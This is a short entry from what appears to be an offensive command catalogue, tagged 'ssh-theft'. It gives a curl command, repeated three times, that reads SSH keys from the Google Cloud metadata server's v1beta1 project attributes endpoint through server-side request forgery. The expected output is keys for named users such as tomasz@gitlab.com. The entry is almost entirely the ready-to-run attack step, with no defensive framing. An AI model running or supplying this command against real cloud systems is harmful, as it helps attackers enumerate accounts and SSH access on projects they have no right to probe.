---
id: cmd-uuid-8
data: >-
  curl
  http://metadata.google.internal/computeMetadata/v1beta1/project/attributes/ssh-key
tags:
  - ssh-theft
  - metadata
type: command
output: SSH key strings for users like tomasz@gitlab.com with expiration dates
executor: bash
platforms:
  - Linux
  - GCP
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:46:09.505Z'
verified: false
validated: true
submitted: true
---
# curl-retrieve-ssh-keys

## Command

```bash
curl http://metadata.google.internal/computeMetadata/v1beta1/project/attributes/ssh-key
```

## Description

Retrieve SSH public keys from project metadata attributes via SSRF.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| URL | Metadata endpoint | Yes |

## Examples

### Basic Usage

```bash
curl http://metadata.google.internal/computeMetadata/v1beta1/project/attributes/ssh-key
```

## Expected Output

SSH key strings for users like tomasz@gitlab.com with expiration dates.

## Related

- [[Related Procedure: Retrieve-Project-SSH-Keys-from-Metadata]]
